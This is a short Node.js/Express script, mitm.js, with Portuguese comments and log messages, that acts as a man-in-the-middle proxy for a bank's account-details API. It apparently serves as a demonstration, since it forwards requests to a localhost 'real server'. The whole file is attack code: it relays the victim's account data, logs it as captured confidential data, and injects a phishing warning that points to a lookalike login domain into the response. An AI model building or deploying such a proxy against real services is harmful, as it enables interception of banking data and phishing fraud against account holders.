// mitm.js
const express = require('express')
const app = express()
const port = 8080

const realServerUrl = 'http://localhost:3000/api/account_details'

// Função auxiliar para criar um delay
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))

app.get('/api/account_details', async (req, res) => {
  console.log('[MITM] Requisição para API do banco interceptada!')

  await delay(500)
  console.log('[MITM] Redirecionando requisição para o servidor real para obter os dados...')

  try {
    const serverResponse = await fetch(realServerUrl)
    const originalData = await serverResponse.json()

    console.log('[MITM] Resposta do servidor legítimo recebida!')

    await delay(1000)
    console.log('[MITM] Dados confidenciais da vítima capturados:')
    console.log(JSON.stringify(originalData, null, 2))

    const maliciousPayload = {
      mensagem: 'Detectamos uma atividade suspeita. Valide sua identidade imediatamente para evitar o bloqueio da sua conta.',
      link_acao: 'http://banco-seguro-validacao-online.com/login'
    }

    await delay(1200)
    console.log('[MITM] Injetando aviso de phishing na resposta...')
    originalData.aviso_importante = maliciousPayload

    console.log('[MITM] Enviando a resposta modificada para a vítima...')
    res.json(originalData)

  } catch (error) {
    console.error('[MITM] Erro:', error.message)
    res.status(500).send('Erro no proxy.')
  }
})

app.listen(port, () => {
  console.log(`Proxy malicioso (MITM) escutando em http://banco-seguro.com:${port}`)
})